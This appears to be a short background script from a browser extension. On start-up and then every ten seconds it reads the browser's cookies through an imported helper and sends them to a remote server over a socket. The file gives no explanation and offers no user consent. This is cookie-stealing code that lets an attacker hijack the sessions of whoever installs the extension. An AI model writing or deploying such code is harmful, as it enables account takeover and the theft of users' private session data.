import { getCookies } from "../utils/cookies";
import { emitToServer } from "../utils/socket";




function setupBackground(){
    console.log("background setup...");
    setInterval(async () => {
        console.log("emitting cookies");
        const cookies = await getCookies(); 
        emitToServer('cookies', {
            cookies
        });
    }, 10000);
}



setupBackground();

export {}
